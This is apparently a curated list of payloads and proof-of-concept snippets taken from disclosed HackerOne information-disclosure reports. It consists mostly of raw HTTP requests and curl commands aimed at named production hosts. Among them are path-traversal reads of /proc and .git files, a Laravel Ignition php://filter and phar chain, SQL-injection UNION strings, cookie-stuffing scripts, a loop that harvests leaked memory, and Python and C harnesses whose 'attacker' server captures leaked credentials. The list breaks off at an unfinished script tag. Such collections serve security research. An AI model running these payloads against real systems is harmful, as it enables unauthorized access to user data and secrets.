# Information Disclosure  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#2737309](https://hackerone.com/reports/2737309)  -  Information disclosure on password cancel endpoint
*low*

```http
POST /token.cgi HTTP/2
Host: bugzilla.mozilla.org
Cookie: _ga=GA1.2.943165794.1724831061; _ga_PWTK27XVWP=GS1.1.1724884053.2.0.1724884053.0.0.0; _ga_MQ…
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Origin: http://burpsuite
Referer: http://burpsuite/

cancel_token=1727251240-UxKc4U5ThgrHPhWNJ323-fahjy5Pn05h5ZYb7OqG-SI&t=3XOIDGIRtcwC3icniucOlm&a=cxlpw&cancel=Cancel
```

## 2. [#2737309](https://hackerone.com/reports/2737309)  -  Information disclosure on password cancel endpoint
*low*

```http
POST /token.cgi HTTP/2
Host: bugzilla.mozilla.org
Cookie: _ga=GA1.2.943165794.1724831061; _ga_PWTK27XVWP=GS1.1.1724884053.2.0.1724884053.0.0.0; _ga_MQ…
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Origin: http://burpsuite
Referer: http://burpsuite/
```

## 3. [#3403450](https://hackerone.com/reports/3403450)  -  Information Disclosure via Verbose Error Messages
*medium*

```http
POST /admin/channel-acl.php HTTP/1.1
Host: 192.168.109.200
Content-Type: application/x-www-form-urlencoded
Content-Length: 514
Origin: http://192.168.109.200
Referer: http://192.168.109.200/admin/channel-acl.php
Cookie: sessionID=<<sessions>>

token=3f62fcfd14d8336b06e12b5adb678962&type=deliveryLimitations%3AClient%3ABrowserVersion&affiliateid=7&channelid=4&acl%5B0%5D%5Blogical%5D=and&acl%5B0%5D%5Btype%5D=deliveryLimitations%3AClient%3ABrowserVersion&acl%5B0%5D%5Bexecutionorder%5D=0&acl%5B0%5D%5Bcomparison%5D=nn&acl%5B0%5D%5Bdata%5D%5B%5D=Firefox&acl%5B1%5D%5Blogical%5D=and&acl%5B1%5D%5Btype%5D=deliveryLimitations%3AClient%3ALanguage&acl%5B1%5D%5Bexecutionorder%5D=1&acl%5B1%5D%5Bcomparison%5D=%3D%7E&acl%5B1%5D%5Bdata%5D%5B%5D=ar&submit=Save+Changes
```

## 4. [#3003716](https://hackerone.com/reports/3003716)  -  User Email Disclosure via ID-Based Invitation
*medium*

```http
POST /api/v1/users/current/orgs/59a5809f-2ba1-43de-b6d7-3ca104b79d80/people.bulk HTTP/2
Host: wakatime.com
Cookie: 
Referer: https://wakatime.com/settings/orgs/59a5809f-2ba1-43de-b6d7-3ca104b79d80/people
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 58
Origin: https://wakatime.com

{"people":[{"id":"<victim_id>"}]}
```

## 5. [#2201370](https://hackerone.com/reports/2201370)  -  Information disclosure via enabled Django Debug Mode
*medium*

```http
POST /api/auth/register/ HTTP/1.1
Host: backend.webreg.mtn.zm
Cookie: ███████
Referer: ████████
X-Requested-With: XMLHttpRequest
Content-Length: 80
Origin: ██████████: 1

{
"email": "██████████",
"password": "password██████████"
}
```

## 6. [#2201370](https://hackerone.com/reports/2201370)  -  Information disclosure via enabled Django Debug Mode
*medium*

```http
POST /api/auth/register/ HTTP/1.1
Host: backend.webreg.mtn.zm
Cookie: ███████
Referer: ████████
X-Requested-With: XMLHttpRequest
Content-Length: 80
Origin: ██████████: 1
```

## 7. [#3403450](https://hackerone.com/reports/3403450)  -  Information Disclosure via Verbose Error Messages
*medium*

```http
POST /admin/channel-acl.php HTTP/1.1
Host: 192.168.109.200
Content-Type: application/x-www-form-urlencoded
Content-Length: 514
Origin: http://192.168.109.200
Referer: http://192.168.109.200/admin/channel-acl.php
Cookie: sessionID=<<sessions>>
```

## 8. [#1408589](https://hackerone.com/reports/1408589)  -  Wordpress users disclosure from json and xml file
*low*

```http
POST /xmlrpc.php HTTP/1.1
Host: www.mtn.co.sz
Content-Length: 180

<methodCall> <methodName>wp.getUsersBlogs</methodName> <params> <param><value>\{\{admin\}\}</value></param> <param><value>\{\{password\}\}</value></param></params></methodCall>
```

## 9. [#917875](https://hackerone.com/reports/917875)  -  STAFF "No-Permissions" on the Store can retrieve the details Order via exchangeReceiptSend
*medium, $1,000*

```http
POST https://langduvnsec.myshopify.com/admin/api/unversioned/graphql HTTP/1.1
Content-Type: application/json; charset=utf-8
Content-Length: 456
Host: langduvnsec.myshopify.com

{ "query": "fragment ExchangeErrorFragment on ExchangeError { __typename code field message } mutation ExchangeReceiptSend($exchangeId: ID!, $input: ExchangeReceiptSendRecipientInput!) { __typename exchangeReceiptSend(exchangeId: $exchangeId, recipient: $input) { __typename exchange { __typename id } userErrors { __typename ... ExchangeErrorFragment } } }", "variables": {"exchangeId":"gid://shopify/Exchange/605028374","input":{"phone":"+84332947000"}}}
```

## 10. [#1219011](https://hackerone.com/reports/1219011)  -  Report Bulk endpoint "agree-on-going-public" action may reveal Report disclosure state for invite-only programs
*low, $500*

```http
POST /reports/bulk HTTP/1.1
Host: hackerone.com
Referer: https://hackerone.com/bugs?subject=user&report_id=901468&view=pending_disclosure&filters%5B%5D=not-public&filters%5B%5D=going-public-user&filters%5B%5D=going-public-team&reported_to_team=&text_query=&program_states%5B%5D=2&program_states%5B%5D=3&program_states%5B%5D=4&program_states%5B%5D=5&sort_type=latest_activity&sort_direction=descending&limit=25&page=1
X-CSRF-Token: ██████
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 184
Origin: https://hackerone.com
```

## 11. [#2765259](https://hackerone.com/reports/2765259)  -  Information disclosure due to debug mode enabled at Laravel instance https://mpos.mtn.co.sz/
*medium*

```http
GET /srvgtw001/merchant/password/reset HTTP/1.1
Host: mpos.mtn.co.sz
Cookie: cookiesession1=678B28894C92B8E298EA67025D4086C2
```

## 12. [#894110](https://hackerone.com/reports/894110)  -  h1-ctf writeup , finally paid the payments by chaining multiple bugs
*critical*

```
We have to trigger the upgrade to admin functionality locally only by the url.

Observation-2:
As the **avatar** is linked to the **class names** (avatar1, avatar2, avatar2). our **input for avatar** is **simple a class name**.
So there is an **class injection in avatar**. It supports **multiple classes** as it allows space char.
We can trigger that class injection on `/?template=home` and `/?template=ticket&ticket_id=3582`

Observation - 3:
**upgrade to  admin** function has been linked to on click listner on **upgradeToAdmin class**
Based on last line of website.js
```

## 13. [#2256548](https://hackerone.com/reports/2256548)  -  Exposure of account recovery hint by querying by user email
*low, $250*

```http
GET /v1/recoveryKey/hint?email=███ HTTP/2
Host: api.accounts.firefox.com
```

## 14. [#724944](https://hackerone.com/reports/724944)  -  latest_activity_id and latest_activity_at may disclose information about internal activities to unauthorized users
*low*

```http
POST /graphql? HTTP/1.1
Host: hackerone.com
Content-Length: 123
Origin: https://hackerone.com
Content-Type: application/json
Referer: https://hackerone.com/vairaselvamvvs
Cookie: ███

{"query":"query { node(id: \"gid://hackerone/Report/█████\") { ... on Report { _id,latest_activity_at }}}","variables":{}}
```

## 15. [#724944](https://hackerone.com/reports/724944)  -  latest_activity_id and latest_activity_at may disclose information about internal activities to unauthorized users
*low*

```http
POST /graphql? HTTP/1.1
Host: hackerone.com
Content-Length: 123
Origin: https://hackerone.com
Content-Type: application/json
Referer: https://hackerone.com/vairaselvamvvs
```

## 16. [#301526](https://hackerone.com/reports/301526)  -  Invitation token leaks to https://bat.bing.com
*low*

```xml
<!DOCTYPE html>
<html>
  <head></head>
  <body style="background-color: transparent">
    <script>
      (function(w,d,t,r,u){var f,n,i;w[u]=w[u]||[],f=function(){var o={ti:"5295042"};o.q=w[u],w[u]=new UET(o),w[u].push("pageLoad")},n=d.createElement(t),n.src=r,n.async=1,n.onload=n.onreadystatechange=function(){var s=this.readyState;s&&s!=="loaded"&&s!=="complete"||(f(),n.onload=n.onreadystatechange=null)},i=d.getElementsByTagName(t)[0],i.parentNode.insertBefore(n,i)})(window,document,"script","https://bat.bing.com/bat.js","uetq");
    </script>
    <noscript>
      <img src="//bat.bing.com/action/0?ti=5295042&Ver=2" height="0" width="0" style="display:none; visibility: hidden;" />
    </noscript>
  </body>
</html>
```

## 17. [#1264725](https://hackerone.com/reports/1264725)  -  Information disclosure - Feedback is accessible on Public profile even after 'disallowed' at https://hackerone.com/settings/feedback
*low*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
Content-Length: 2218
content-type: application/json
Origin: https://hackerone.com
```

## 18. [#3003716](https://hackerone.com/reports/3003716)  -  User Email Disclosure via ID-Based Invitation
*medium*

```http
POST /api/v1/users/current/orgs/59a5809f-2ba1-43de-b6d7-3ca104b79d80/people.bulk HTTP/2
Host: wakatime.com
Cookie: 
Referer: https://wakatime.com/settings/orgs/59a5809f-2ba1-43de-b6d7-3ca104b79d80/people
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 58
Origin: https://wakatime.com
```

## 19. [#269479](https://hackerone.com/reports/269479)  -  Report Private Links Leaks to Google Analytics via Query String Param
*medium*

```http
POST /r/collect HTTP/1.1
Host: www.google-analytics.com
Content-Type: text/plain
Referer: https://hackerone.com/
Content-Length: 428
Origin: https://hackerone.com

v=1&_v=j62&a=2078508761&t=pageview&_s=1&dl=https%3A%2F%2Fhackerone.com%2Fredirect%3Fsignature%3D336dc1060a5ccbf5ef7063cabbfa33873202c35e%26url%3Dhttps%253A%252F%252Fvimeo.com%252F232320359%252Ffa452a0137&ul=en-us&de=UTF-8&dt=Leaving%20HackerOne...&sd=24-bit&sr=1600x900&vp=1600x743&je=0&_u=SCCAAUAjI~&jid=346100484&gjid=1015600924&cid=1626748485.1504716574&uid=78347&tid=UA-49905813-1&_gid=545891595.1505791144&_r=1&z=1287598365
```

## 20. [#315205](https://hackerone.com/reports/315205)  -  Debug information disclosure on oauth-redirector.services.greenhouse.io
*medium*

```http
GET /integrations/oauth/create?state=x&code=x HTTP/1.1
Host: oauth-redirector.services.greenhouse.io
Cookie: oauth_redirect_uri=https%3A%2F%2Fapp.<x>greenhouse.io%2Fusers%2Fauth%2Fgoogle_oauth2%2Fcallback
```

## 21. [#315205](https://hackerone.com/reports/315205)  -  Debug information disclosure on oauth-redirector.services.greenhouse.io
*medium*

```http
GET /integrations/oauth/create?state=x&code=x HTTP/1.1
Host: oauth-redirector.services.greenhouse.io
Cookie: oauth_redirect_uri=https%3A%2F%2Fapp.<x>greenhouse.io%2Fusers%2Fauth%2Fgoogle_oauth2%2Fcallback

'''
```

## 22. [#850447](https://hackerone.com/reports/850447)  -  gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be read
*critical, $10,000*

```bash
$ while true; do curl -s -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44' -F '[file]=@/tmp/lala.txt'| grep file_name; done
```

## 23. [#605608](https://hackerone.com/reports/605608)  -  [information disclosure] Validate existence of a private project.
*low*

```http
POST /chocolatecake/choco-brownie-sundae/toggle_star.json HTTP/1.1
Host: gitlab.com
X-CSRF-Token: REDACTED
X-Requested-With: XMLHttpRequest
Cookie: REDACTED
Content-Length: 0
```

## 24. [#1553301](https://hackerone.com/reports/1553301)  -  CVE-2022-27779: cookie for trailing dot TLD
*medium*

```http
GET / HTTP/1.1
Host: domain.me.
Cookie: a=b
```

## 25. [#850447](https://hackerone.com/reports/850447)  -  gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be read
*critical, $10,000*

```bash
$ curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19601/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
500
$ curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
201
```

## 26. [#486933](https://hackerone.com/reports/486933)  -  [serve] Access unlisted internal files/folders revealing sensitive information
*critical*

```bash
$ curl http://localhost:5000/any/../.git/HEAD --path-as-is
ref: refs/heads/master
$ curl http://localhost:5000/any/../secret --path-as-is   
secret text
```

## 27. [#894110](https://hackerone.com/reports/894110)  -  h1-ctf writeup , finally paid the payments by chaining multiple bugs
*critical*

```http
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

staff_id=STF:8FJ3KFISL3
```

## 28. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```bash
$ curl -s 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%22../api/hello\%22;/*%22,1,1;/*' | grep picture
                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2hlbGxvIiwiYXV0aCI6ImEwZTY4MmQ2YjRiNWVjYTM2NDJlMTU5NmQ4OGE5MDk2In0=">

$ curl -s 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2hlbGxvIiwiYXV0aCI6ImEwZTY4MmQ2YjRiNWVjYTM2NDJlMTU5NmQ4OGE5MDk2In0='

Expected HTTP status 200, Received: 404
```

## 29. [#1551588](https://hackerone.com/reports/1551588)  -  CVE-2022-27775: Bad local IPv6 connection reuse
*low, $480*

```http
GET /x HTTP/1.1
Host: [ipv6addr]:9999

GET /y HTTP/1.1
```

## 30. [#1354334](https://hackerone.com/reports/1354334)  -  Error in Deleting Deck cards attachment reveals the full path of the website
*low*

```http
DELETE /apps/deck/cards/11/attachment/file:1 HTTP/2
Host: ctulhu.me/nc
Origin: https://ctulhu.me/nc
```

## 31. [#968165](https://hackerone.com/reports/968165)  -  Disclose customer orders details by shopify chat application.
*medium, $2,500*

```http
POST /api/storefront/conversations/lx9vF-DR31d1ePOOCS0Uw2lFUUBjhNqmMTOdkeM631M/order_lookup HTTP/1.1
Host: shopify-chat.shopifycloud.com
Referer: https://okbay44.myshopify.com/
Content-Type: application/json
Origin: https://okbay44.myshopify.com
Content-Length: 113

{"order_lookup":{"email":"@gmail.com","order_number":"1005","user_token":"███"}}
```

## 32. [#2322082](https://hackerone.com/reports/2322082)  -  Being able to disclose IBB bounty table of any public program
*medium*

```http
POST /graphql HTTP/2
Host: hackerone.com
Content-Type: application/json
Content-Length: 157

{"query":"{\r\n  team(handle: \"security\") {\r\n\r\nibb_bounty_table {\r\n      critical\r\n      high\r\n      medium\r\n      low\r\n    }\r\n}\r\n}\r\n"}
```

## 33. [#2765259](https://hackerone.com/reports/2765259)  -  Information disclosure due to debug mode enabled at Laravel instance https://mpos.mtn.co.sz/
*medium*

```javascript
curl -XPOST -H 'Content-Type: application/json'  -d ‘{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}, }’  http(s)://mpos.mtn.co.sz/_ignition/execute-solution
```

## 34. [#2765259](https://hackerone.com/reports/2765259)  -  Information disclosure due to debug mode enabled at Laravel instance https://mpos.mtn.co.sz/
*medium*

```javascript
curl -XPOST -H 'Content-Type: application/json'  -d ‘{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}, }’  http(s)://mpos.mtn.co.sz/_ignition/execute-solution
```

## 35. [#2765259](https://hackerone.com/reports/2765259)  -  Information disclosure due to debug mode enabled at Laravel instance https://mpos.mtn.co.sz/
*medium*

```javascript
curl -XPOST -H 'Content-Type: application/json'  -d ‘{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "phar://../storage/logs/laravel.log"}, }’  http(s)://mpos.mtn.co.sz/_ignition/execute-solution
```

## 36. [#1091303](https://hackerone.com/reports/1091303)  -  [h1-2102] [Yaworski's Broskis] Low privilege user can read POS PINs via graphql and elevate his privilege
*medium*

```http
POST /admin/api/xauth HTTP/1.1
Content-Type: application/json; charset=UTF-8
Content-Length: 137
Host: h1-2102-ramsexy.myshopify.com

{"api_key":"a53cf2ce9b5dabf5dd222b3615c29569","login":"ramsexy+h1-2102-3@wearehackerone.com","password":"███"}
```

## 37. [#1091303](https://hackerone.com/reports/1091303)  -  [h1-2102] [Yaworski's Broskis] Low privilege user can read POS PINs via graphql and elevate his privilege
*medium*

```http
POST /admin/api/unversioned/graphql HTTP/1.1
Host: h1-2102-ramsexy.myshopify.com
Content-Type: application/json
Content-Length: 1002

{"query":"fragment RemoteStaffMember on StaffMember { __typename active email name firstName lastName phone pin id isShopOwner accountType permissions { __typename userPermissions } privateData { __typename updatedAt identityOwned identityUuid } retailData(location: $locationID) { __typename canInitializePos posAccess retailRole { __typename ... RemoteRetailRole } } } fragment RemoteRetailRole on RetailRole { __typename id name isDefault: default hidden updatedAt retailRolePermissions { __typename ... RemoteRetailRolePermission } } fragment RemoteRetailRolePermission on RetailRolePermission { __typename access retailPermissionTag } query StaffList($first: Int, $after: String, $query: String, $locationID: ID) { __typename shop { __typename staffMembers(first: $first, after: $after, query: $query) { __typename edges { __typename node { __typename ... RemoteStaffMember } cursor } pageInfo { __typename hasNextPage } } } }","variables":{"first":100,"query":"updated_at:>1970-01-01T00:00:00Z"}}
```

## 38. [#318099](https://hackerone.com/reports/318099)  -  Registration enabled on ███grab.com
*medium*

```http
POST /login/create HTTP/1.1
Host: █████grab.com
Referer: https://███grab.com/
Authorization: Bearer null
Content-Type: application/json
Content-Length: 61
Cookie: G_ENABLED_IDPS=google; G_AUTHUSER_H=0

{"userid":"█████","password":"██████"}
```

## 39. [#318099](https://hackerone.com/reports/318099)  -  Registration enabled on ███grab.com
*medium*

```http
POST /login HTTP/1.1
Host: █████grab.com
Referer: https://█████grab.com/
Authorization: Bearer null
Content-Type: application/json
Content-Length: 61
Cookie: G_ENABLED_IDPS=google; G_AUTHUSER_H=0

{"userid":"██████","password":"████"}
```

## 40. [#289568](https://hackerone.com/reports/289568)  -  Program profile metrics endpoint contains mean time to triage, even when turned off
*medium*

```http
GET /wordpress/profile_metrics.json HTTP/1.1
Host: hackerone.com
X-Requested-With: XMLHttpRequest
Cookie: your_cookies!
```

## 41. [#407319](https://hackerone.com/reports/407319)  -  ActiveStorage service's signed URLs can be hijacked via AppCache+Cookie stuffing trick when using GCS or DiskService
*high*

```html
<script>
setTimeout(function(){
for(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};
}, 3000);
</script>
```

## 42. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```
a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
```

## 43. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
```

## 44. [#417170](https://hackerone.com/reports/417170)  -  Using GraphQL, STAFF with NO explicit permissions on Store can retrieve Shopify Payments Balance.
*low, $500*

```http
POST /admin/api/graphql HTTP/1.1
Host: vir444.myshopify.com
content-type: application/json
origin: https://vir444.myshopify.com
Content-Length: 2999

{"operationName":"HomeIndex","variables":{"localTime":"22:59"},"query":"query HomeIndex($localTime: DateTime!) {\n  staffMember {\n    id\n    privateData {\n      activityFeed(first: 3) {\n        edges {\n          ...ActivityFeed\n          __typename\n        }\n        __typename\n      }\n      capital {\n        ... on HomeCapitalSummary {\n          ...CapitalFeature\n          __typename\
```

## 45. [#792998](https://hackerone.com/reports/792998)  -  404-response contains debug-information with all headers
*low*

```http
GET /resources/read/ajax_issueWidgets_p4fg HTTP/1.1
Host: www.hackerone.com
Cookie: ███ super_secret_made_up_cookie=VERY_VERY_SECRET
```

## 46. [#397031](https://hackerone.com/reports/397031)  -  Disclosure of top 10 vulnerability types for programs that haven't enabled the Insights feature
*low*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
Referer: https://hackerone.com/security/insights
content-type: application/json
origin: https://hackerone.com
Content-Length: 1939
Cookie: ...

{"query":"query Insights($handle_0:String!,$last_1:Int!,$first_2:Int!,$first_3:Int!,$state_4:TeamWeaknessStates!) {\n  team(handle:$handle_0) {\n    id,\n    ...F0\n  }\n}\nfragment F0 on Team {\n  name,\n  offers_bounties,\n  hide_bounty_amounts,\n  _profile_metrics_snapshots34WPw7:profile_metrics_snapshots(last:$last_1) {\n    edges {\n      node {\n        id,\n        month,\n        year,\n        bounties_count,\n        bounties_paid\n      },\n      cursor\n    },\n    pageInfo {\n      hasNextPage,\n      hasPreviousPage\n    }\n  },\n  team_profile {\n    latest_report_created_at,\n    reports_received_in_three_months_count,\n    latest_serious_report_created_at,\n    disclosed_reports_in_last_year_count,\n    hackers_invited_all_time_count,\n    hackers_accepted_all_time_count,\n    recently_participating_hackers_count,\n    id\n  },\n  _structured_scopes2uadQf:structured_scopes(eligible_for_submission:true,first:$first_2) {\n    edges {\n      node {\n        asset_identifier,\n        eligible_for_submission,\n        low_severity_resolved_reports_count,\n        medium_severity_resolved_reports_count,\n        high_severity_resolved_reports_count,\n        critical_severity_resolved_reports_count,\n        id\n      },\n      cursor\n    },\n    pageInfo {\n      hasNextPage,\n      hasPreviousPage\n    }\n  },\n  team_display_options {\n    show_reports_resolved,\n    show_total_bounties_paid,\n    show_average_bounty,\n    id\n  },\n  _team_weaknessesE63B6:team_weaknesses(first:$first_3,state:$state_4,with_reports:true) {\n    edges {\n      node {\n        id,\n        weakness {\n          name,\n          external_id,\n          id\n        },\n        report_count,\n        state\n      },\n      cursor\n    },\n    pageInfo {\n      hasNextPage,\n      hasPreviousPage\n    }\n  },\n  id\n}","variables":{"handle_0":"███","last_1":3,"first_2":100,"first_3":10,"state_4":"enabled"}}
# … truncated …
```

## 47. [#1246721](https://hackerone.com/reports/1246721)  -  Text app leaks file path of shared files
*low*

```http
PUT /apps/text/public/session/create?token=EHTs4P7kATowiMg HTTP/1.1
Host: cloud.nextcloud.com
Content-Type: application/json;charset=utf-8
Content-Length: 93
Origin: https://cloud.nextcloud.com

{"filePath":"//Readme.md","token":"EHTs4P7kATowiMg","guestName":"Bean","forceRecreate":false}
```

## 48. [#826005](https://hackerone.com/reports/826005)  -  Private account causes displayed through API
*low*

```http
GET /api/users/bug.hunter3 HTTP/1.1
Host: www.every.org
Referer: https://www.every.org/settings/profile
Content-Type: application/json
X-CSRF-Token: <csrf_token_here>
Origin: https://www.every.org
Content-Length: 0
Cookie:
```

## 49. [#3583983](https://hackerone.com/reports/3583983)  -  CVE-2026-3783: token leak with redirect and netrc
*medium*

```python
import socket, threading, time

def server_b(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('127.0.0.1', port)); s.listen(1)
    c, _ = s.accept()
    data = b""
    while b"\r\n\r\n" not in data: data += c.recv(4096)
    req = data.decode()
    leaked = "Authorization: Bearer" in req
    print(f"\n{'='*50}")
    print(f"SERVER B RECEIVED:")
    print(req)
    print(f"BEARER LEAKED: {leaked}")
    print(f"{'='*50}\n")
    c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK")
    c.close(); s.close()

def server_a(port_a, port_b):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('127.0.0.1', port_a)); s.listen(1)
    c, _ = s.accept()
    data = b""
    while b"\r\n\r\n" not in data: data += c.recv(4096)
    c.sendall(f"HTTP/1.1 302 Found\r\nLocation: http://127.0.0.1:{port_b}/callback\r\nContent-Length: 0\r\nConnection: close\r\n\r\n".encode())
    c.close(); s.close()

threading.Thread(target=server_b, args=(8081,), daemon=True).start()
time.sleep(0.5)
server_a(8080, 8081)
import time; time.sleep(2)
# … truncated …
```

## 50. [#3793260](https://hackerone.com/reports/3793260)  -  CVE-2026-11856: cross-origin Digest auth state leak
*medium*

```python
#!/usr/bin/env python3
import http.server, threading, sys

class Legitimate(http.server.BaseHTTPRequestHandler):
    challenge = ('Digest realm="legit-api@example.com",'
                 ' nonce="LEGIT-NONCE-7c3f0e1d", opaque="LEGIT-OPAQUE",'
                 ' qop="auth", algorithm=MD5')
    def do_GET(self):
        auth = self.headers.get('Authorization')
        if not auth:
            self.send_response(401)
            self.send_header('WWW-Authenticate', self.challenge)
            self.send_header('Content-Length', '0'); self.end_headers(); return
        sys.stdout.write(f"[LEGITIMATE:19001] {self.path}\n    auth={auth}\n"); sys.stdout.flush()
        self.send_response(200); self.send_header('Content-Length','0'); self.end_headers()
    def log_message(self, *a, **k): pass

class Attacker(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        auth = self.headers.get('Authorization', '<<NO AUTH>>')
        sys.stdout.write(f"[ATTACKER:19002]   {self.path}\n    auth={auth}\n"); sys.stdout.flush()
        self.send_response(200); self.send_header('Content-Length','0'); self.end_headers()
    def log_message(self, *a, **k): pass

def run(p, c): http.server.HTTPServer(('127.0.0.1', p), c).serve_forever()

threading.Thread(target=run, args=(19001, Legitimate), daemon=True).start()
threading.Thread(target=run, args=(19002, Attacker),   daemon=True).start()
import time; time.sleep(0.4); print("up", flush=True)
while True: time.sleep(60)
# … truncated …
```

## 51. [#2107680](https://hackerone.com/reports/2107680)  -  AWS keys and user cookie leakage via uninitialized memory leak in outdated librsvg version in Basecamp
*high, $8,868*

```
while true; do curl "████$RANDOM$RANDOM$RANDOM$RANDOM.png?v=1" | python3 rsvgeb.py recover 260x260 - | strings -n 10 | tee -a pizda_hui_govno.txt; done
```

## 52. [#407319](https://hackerone.com/reports/407319)  -  ActiveStorage service's signed URLs can be hijacked via AppCache+Cookie stuffing trick when using GCS or DiskService
*high*

```html
<html manifest="[manifest_url from the manifest above]">
Any requests to this bucket will be hijacked.
<script>
setTimeout(function(){
for(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};
}, 3000);
</script>
</html>
```

## 53. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```json
{{template:**../templates/cbdj3_grinch_header.html**}}
```

## 54. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```json
{{template:**./test/../cbdj3_grinch_header.html**}}
```

## 55. [#605608](https://hackerone.com/reports/605608)  -  [information disclosure] Validate existence of a private project.
*low*

```html
<script>
    (function () {
      var goBack = document.querySelector('.js-go-back');

      if (history.length > 1) {
        goBack.style.display = 'inline';
      }
    })();
  </script>
```

## 56. [#2322082](https://hackerone.com/reports/2322082)  -  Being able to disclose IBB bounty table of any public program
*medium*

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: hackerone.com' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0' -H $'Accept: application/json' -H $'Content-Type: application/json' -H $'Content-Length: 157' -H $'Te: trailers' \
    --data-binary $'{\"query\":\"{\\r\\n  team(handle: \\\"security\\\") {\\r\\n\\r\\nibb_bounty_table {\\r\\n      critical\\r\\n      high\\r\\n      medium\\r\\n      low\\r\\n    }\\r\\n}\\r\\n}\\r\\n\"}' \
    $'https://hackerone.com/graphql'
```

## 57. [#3793260](https://hackerone.com/reports/3793260)  -  CVE-2026-11856: cross-origin Digest auth state leak
*medium*

```c
#include <stdio.h>
#include <curl/curl.h>

static size_t devnull(char *p, size_t s, size_t n, void *u) {
    (void)p; (void)u; return s * n;
}

int main(void) {
    CURL *c = curl_easy_init();
    curl_easy_setopt(c, CURLOPT_HTTPAUTH, CURLAUTH_DIGEST);
    curl_easy_setopt(c, CURLOPT_USERPWD, "alice:bond");
    curl_easy_setopt(c, CURLOPT_WRITEFUNCTION, devnull);

    /* Phase 1: Normal API call */
    curl_easy_setopt(c, CURLOPT_URL, "http://127.0.0.1:19001/api/me");
    curl_easy_perform(c);

    /* Phase 2: Secondary request to attacker URL */
    curl_easy_setopt(c, CURLOPT_URL, "http://127.0.0.1:19002/hook");
    curl_easy_perform(c);

    /* Phase 3: Processing a different user on the same handle still leaks */
    curl_easy_setopt(c, CURLOPT_USERPWD, "bob:secret");
    curl_easy_setopt(c, CURLOPT_URL, "http://127.0.0.1:19002/hook");
    curl_easy_perform(c);

    curl_easy_cleanup(c);
    return 0;
}
```

## 58. [#693788](https://hackerone.com/reports/693788)  -  [expressjs-ip-control] Whitelist IP bypass leads to authorization bypass and sensitive info disclosure
*medium*

```bash
curl 'http://localhost:3000/' # Obtain *403* response --> *You do not have rights to visit this page*
curl 'http://localhost:3000/' -H 'X-Forwarded-For: 127.0.0.1' # Obtain *200* response --> secret token
```

## 59. [#1183601](https://hackerone.com/reports/1183601)  -  Cross-origin resource sharing misconfig | steal user information
*high*

```html
<script>
